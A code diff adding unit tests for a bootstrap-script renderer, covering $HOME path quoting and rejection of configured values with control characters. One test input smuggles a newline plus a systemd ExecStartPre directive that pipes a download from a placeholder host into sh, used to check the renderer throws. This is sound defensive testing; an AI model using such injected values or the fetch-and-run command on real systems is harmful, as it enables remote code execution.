@@ -344,6 +344,37 @@ describe('bootstrap rendering', () => {
     assert.equal(shellPath('$HOME/.dsh'), `"$HOME/"'.dsh'`)
     assert.equal(shellPath('/srv/dsh'), `'/srv/dsh'`)
     assert.equal(shellPath('~'), '"$HOME"')
+    // `$HOME` on its own used to fall through to a literal, so `--dsh-home
+    // '$HOME'` installed into a directory named `$HOME`.
+    assert.equal(shellPath('$HOME'), '"$HOME"')
+  })
+
+  it('refuses a configured value that could inject a unit directive', () => {
+    // The unit is written with an expanding heredoc, so a newline in a
+    // configured value ends one directive and starts another — which would run
+    // whatever the second line says as that account.
+    const base = {
+      profile: 'web',
+      port: 0,
+      dshHome: '~/.dsh',
+      dshVersion: '0.2.2-rc.3',
+      pnpmVersion: '11.21.0',
+      start: 'systemd' as const,
+      agentTarball: '/tmp/a.tgz',
+    }
+    assert.throws(
+      () => renderBootstrapScript({
+        ...base,
+        dshHome: '/srv/dsh\nExecStartPre=/bin/sh -c "curl -s http://evil.test/x | sh"',
+      }),
+      /dshHome must not contain control characters/u,
+    )
+    assert.throws(
+      () => renderBootstrapScript({ ...base, modelBaseUrl: 'https://api.example.test/\nX' }),
+      /modelBaseUrl must not contain control characters/u,
+    )
+    // A value without control characters still renders.
+    assert.match(renderBootstrapScript({ ...base, dshHome: '/srv/dsh' }), /DSH_HOME='\/srv\/dsh'/u)
   })
 
   it('keeps the rendered port and profile', () => {
